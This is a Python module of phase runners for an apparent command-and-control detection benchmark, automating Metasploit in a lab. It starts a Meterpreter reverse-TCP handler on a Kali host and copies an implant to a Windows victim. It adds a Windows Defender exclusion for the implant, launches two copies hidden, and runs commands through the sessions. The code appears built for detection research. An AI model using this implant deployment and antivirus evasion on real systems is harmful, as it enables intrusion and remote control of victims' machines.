"""Meterpreter phase runners for bench_v4 AURORA-CHAIN-002.

These runners implement the same callable contract as the CALDERA phase runners
in runtime.py, but drive two Metasploit Meterpreter reverse-TCP implants instead
of CALDERA abilities. All Metasploit interactions go through SSH to Kali where
msfrpcd (pymetasploit3) is installed.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import time
from datetime import datetime, timezone
from typing import Any, Callable, Mapping

from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (
    CalderaBootstrapPhaseResult,
    CalderaScenarioPhaseResult,
    CalderaTargetCandidate,
    BenchV4RuntimeError,
    RuntimeCase,
    RuntimeValues,
    deterministic_runtime_source_id,
    verify_deployment_manifest,
)
from .runtime import find_driver_agent

__all__ = [
    "run_meterpreter_bootstrap_phase",
    "resolve_meterpreter_target_phase",
    "run_meterpreter_scenario_phase",
]

KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
METERPRETER_IMPLANT_SOURCE = os.environ.get(
    "C2TRACE_METERPRETER_IMPLANT_SOURCE",
    "/tmp/aurora-chain002-x64-stageless.exe",
)
METERPRETER_LPORT = 18447


def _ssh_run_py(script: str, timeout: float = 120) -> str:
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(
            f"SSH python failed (rc={result.returncode}): {result.stderr}"
        )
    return result.stdout


def _scp_implant_to_windows(victim_path: str) -> str:
    scp_cmd = ["scp"] + SSH_OPTS + [
        f"{KALI_SSH}:{METERPRETER_IMPLANT_SOURCE}", victim_path,
    ]
    result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SCP implant failed: {result.stderr}")
    return victim_path


def _add_defender_exclusion(path: str) -> None:
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _execute_implant(path: str) -> int:
    ps = f"$p = Start-Process -FilePath '{path}' -PassThru -WindowStyle Hidden; Write-Output $p.Id"
    result = subprocess.run(
        ["powershell", "-Command", ps],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"implant execution failed: {result.stderr}")
    lines = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if lines and lines[-1].isdigit():
        return int(lines[-1])
    raise BenchV4RuntimeError(f"could not parse implant PID from: {result.stdout}")


def _kill_stale_sessions() -> None:
    """Kill all existing Meterpreter sessions and handler jobs before a new trial."""
    script = (
        "from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod\n"
        "import time\n"
        "c = MsfRpcClient('msf', server='127.0.0.1', port=55553, ssl=False, uri='/api/')\n"
        "for sid in list(c.sessions.list.keys()):\n"
        "    try:\n"
        "        c.call(MsfRpcMethod.SessionStop, [int(sid)])\n"
        "    except Exception:\n"
        "        pass\n"
        "    time.sleep(1)\n"
        "for jid in list(c.jobs.list.keys()):\n"
        "    try:\n"
        "        c.jobs.stop(int(jid))\n"
        "    except Exception:\n"
        "        pass\n"
        "    time.sleep(1)\n"
        "time.sleep(2)\n"
    )
    try:
        _ssh_run_py(script, timeout=60)
    except BenchV4RuntimeError:
        pass


def _kill_stale_payload_processes() -> None:
    """Kill any residual c2t_ payload processes on Windows before a new trial."""
    ps = (
        "Get-Process | Where-Object {$_.ProcessName -like 'c2t_*' "
        "-and $_.ProcessName -ne 'c2t_control_exploratory_20260917' -and $_.ProcessName -ne 'c2t_control_new'} | "
        "Stop-Process -Force -ErrorAction SilentlyContinue"
    )
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _start_handler_and_deploy() -> dict:
    """Start Metasploit handler via msfrpcd consoles API, return marker dict.

    The handler is started as a background job with ExitOnSession=false so it
    stays alive after sessions connect.  Returns a dict with console_id.
    """
    script = (
        "from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod\n"
        "import time, json\n"
        "c = MsfRpcClient('msf', server='127.0.0.1', port=55553, ssl=False, uri='/api/')\n"
        "console = c.consoles.console()\n"
        "console.write('use exploit/multi/handler\\n')\n"
        "time.sleep(1)\n"
        "console.write('set PAYLOAD windows/x64/meterpreter_reverse_tcp\\n')\n"
        "time.sleep(1)\n"
        "console.write('set LHOST " + KALI_IP + "\\n')\n"
        "time.sleep(1)\n"
        "console.write('set LPORT " + str(METERPRETER_LPORT) + "\\n')\n"
        "time.sleep(1)\n"
        "console.write('set ExitOnSession false\\n')\n"
        "time.sleep(1)\n"
        "console.write('exploit -j\\n')\n"
        "time.sleep(8)\n"
        "out = console.read()\n"
        "print(json.dumps({'console_id': console.cid, 'output_tail': out.get('data','')[-300:]}))\n"
    )
    out = _ssh_run_py(script, timeout=60)
    try:
        return json.loads(out.strip().splitlines()[-1])
    except (json.JSONDecodeError, IndexError) as exc:
        raise BenchV4RuntimeError(f"handler start failed: {out}") from exc


def _wait_for_sessions(count: int, timeout: float, poll: float) -> list[dict]:
    """Poll msfrpcd sessions.list until *count* sessions from the victim appear."""
    script = (
        "from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod\n"
        "import json\n"
        "c = MsfRpcClient('msf', server='127.0.0.1', port=55553, ssl=False, uri='/api/')\n"
        "sessions = c.sessions.list\n"
        "print(json.dumps(sessions))\n"
    )
    deadline = time.time() + timeout
    while time.time() < deadline:
        out = _ssh_run_py(script, timeout=60)
        try:
            data = json.loads(out.strip().splitlines()[-1])
        except (json.JSONDecodeError, IndexError):
            data = {}
        victim_sessions = [
            {"sid": sid, **info}
            for sid, info in data.items()
            if isinstance(info, dict)
            and info.get("session_host") == os.environ.get(
                "C2TRACE_VICTIM_IP", "192.168.21.145"
            )
        ]
        if len(victim_sessions) >= count:
            return victim_sessions[:count]
        time.sleep(poll)
    raise BenchV4RuntimeError(
        f"Expected {count} sessions, got {len(victim_sessions)} within timeout"
    )


def _run_arp_query(session_id: int) -> dict:
    """Issue ARP_QUERY (arp -a) via the console API on the given session."""
    script = (
        "from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod\n"
        "import json, time\n"
        "c = MsfRpcClient('msf', server='127.0.0.1', port=55553, ssl=False, uri='/api/')\n"
        "console = c.consoles.console()\n"
        "console.write('sessions -i " + str(session_id) + "\\n')\n"
        "time.sleep(2)\n"
        "console.write('arp -a\\n')\n"
        "time.sleep(5)\n"
        "out = console.read()\n"
        "print(json.dumps({'data': out.get('data','')[-2000:]}))\n"
        "console.write('background\\n')\n"
        "time.sleep(1)\n"
    )
    out = _ssh_run_py(script, timeout=60)
    try:
        return json.loads(out.strip().splitlines()[-1])
    except (json.JSONDecodeError, IndexError) as exc:
        raise BenchV4RuntimeError(f"ARP_QUERY failed: {out}") from exc


def _get_session_pids(session_ids: list[int]) -> dict[int, int]:
    """Return {session_id: pid} for each session via getpid command."""
    result: dict[int, int] = {}
    for sid in session_ids:
        script = (
            "from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod\n"
            "import json, time, re\n"
            "c = MsfRpcClient('msf', server='127.0.0.1', port=55553, ssl=False, uri='/api/')\n"
            "console = c.consoles.console()\n"
            "console.write('sessions -i " + str(sid) + "\\n')\n"
            "time.sleep(2)\n"
            "console.write('getpid\\n')\n"
            "time.sleep(3)\n"
            "out = console.read()\n"
            "data = out.get('data','')\n"
            "m = re.search(r'Current pid:\\s*(\\d+)', data)\n"
            "print(json.dumps({'sid': " + str(sid) + ", 'pid': int(m.group(1)) if m else None}))\n"
            "console.write('background\\n')\n"
            "time.sleep(1)\n"
        )
        out = _ssh_run_py(script, timeout=60)
        try:
            parsed = json.loads(out.strip().splitlines()[-1])
            if parsed.get("pid"):
                result[sid] = parsed["pid"]
        except (json.JSONDecodeError, IndexError):
            pass
    return result


def _synthetic_operation(run_id: str, role: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}",
        "name": f"AURORA-CHAIN-002 {role} ({run_id})",
        "state": "finished",
        "platform": "windows" if role == "bootstrap" else "linux",
    }


def _synthetic_link(run_id: str, role: str, ability_id: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}-link",
        "ability": {"ability_id": ability_id},
        "status": 0,
        "command": "meterpreter_deploy" if role == "bootstrap" else "meterpreter_arp_query",
        "host": "DESKTOP-G9IIQ2P",
        "pid": None,
    }


def run_meterpreter_bootstrap_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaBootstrapPhaseResult:
    """Deploy two Meterpreter reverse-TCP implants and return a synthetic Bootstrap result."""
    if event_sink:
        event_sink("meterpreter_bootstrap_start", {"run_id": values.run_id})

    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)

    # Clean up stale sessions, jobs, and processes before starting
    _kill_stale_sessions()
    _kill_stale_payload_processes()

    # Start Metasploit handler via msfrpcd consoles API
    handler_info = _start_handler_and_deploy()
    if event_sink:
        event_sink("meterpreter_handler_started", {"console_id": handler_info.get("console_id")})

    # Copy implant from Kali to Windows victim
    implant_path = values.target_path
    _scp_implant_to_windows(implant_path)
    _add_defender_exclusion(implant_path)

    # Execute TWO instances of the same payload
    pid1 = _execute_implant(implant_path)
    time.sleep(3)
    pid2 = _execute_implant(implant_path)

    # Wait for both sessions to appear
    time.sleep(5)
    sessions = _wait_for_sessions(
        count=2, timeout=120, poll=3.0,
    )

    # Get PIDs via Meterpreter getpid
    sid_list = [int(s["sid"]) for s in sessions]
    pid_map = _get_session_pids(sid_list)

    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)

    if event_sink:
        event_sink("meterpreter_bootstrap_complete", {
            "implant_path": implant_path,
            "pids": [pid1, pid2],
            "session_ids": sid_list,
        })

    return CalderaBootstrapPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=verified.manifest_sha256,
        runtime_source_id=runtime_source_id,
        install_receipt={
            "synthetic": True,
            "implant_path": implant_path,
            "pids": [pid1, pid2],
            "session_ids": sid_list,
            "pid_map": pid_map,
        },
        runtime_source={"id": runtime_source_id, "name": "c2trace_aurora_runtime_source"},
        control_agent=dict(control),
        driver_agent=dict(driver) if driver else None,
        baseline_paws=baseline_paws,
        started_at_utc=started,
        bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"),
        bootstrap_links=(bootstrap_link,),
        bootstrap_report={
            "state": "finished",
            "outcome": "dual_implant_deployed",
            "pids": [pid1, pid2],
            "session_ids": sid_list,
        },
        bootstrap_event_logs=(),
    )


def resolve_meterpreter_target_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    *,
    timeout_seconds: float = 360.0,
    poll_seconds: float = 3.0,
) -> CalderaTargetCandidate:
    """Find the two Meterpreter sessions for the deployed implants."""
    sessions = _wait_for_sessions(
        count=2, timeout=timeout_seconds, poll=poll_seconds,
    )
    sid_list = [int(s["sid"]) for s in sessions]
    pid_map = _get_session_pids(sid_list)

    primary = sessions[0]
    raw_identity = {
        "pid": pid_map.get(sid_list[0]),
        "path": values.target_path,
        "host": primary.get("info", "DESKTOP-G9IIQ2P"),
        "session_id": primary["sid"],
        "remote_address": primary.get("tunnel_peer"),
        "secondary_pid": pid_map.get(sid_list[1]) if len(sid_list) > 1 else None,
        "secondary_session_id": str(sid_list[1]) if len(sid_list) > 1 else None,
        "all_session_ids": [str(s) for s in sid_list],
    }

    return CalderaTargetCandidate(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        raw_identity=raw_identity,
        scenario_paw=agent_paw(bootstrap.control_agent),
    )


def run_meterpreter_scenario_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    candidate: CalderaTargetCandidate,
    frozen_identity: Mapping[str, Any],
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaScenarioPhaseResult:
    """Issue one ARP_QUERY (arp -a) via the primary Meterpreter session."""
    session_id = candidate.raw_identity["session_id"]
    if event_sink:
        event_sink("meterpreter_scenario_start", {"session_id": session_id})

    arp_result = _run_arp_query(int(session_id))

    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)

    if event_sink:
        event_sink("meterpreter_scenario_complete", {
            "outcome": "arp_query_completed",
            "output_len": len(arp_result.get("data", "")),
        })

    return CalderaScenarioPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        target_identity=dict(frozen_identity),
        scenario_operation=_synthetic_operation(values.run_id, "scenario"),
        scenario_links=(scenario_link,),
        scenario_report={
            "state": "finished",
            "outcome": "arp_query_completed",
            "arp_output": arp_result.get("data", ""),
        },
        scenario_event_logs=(),
    )
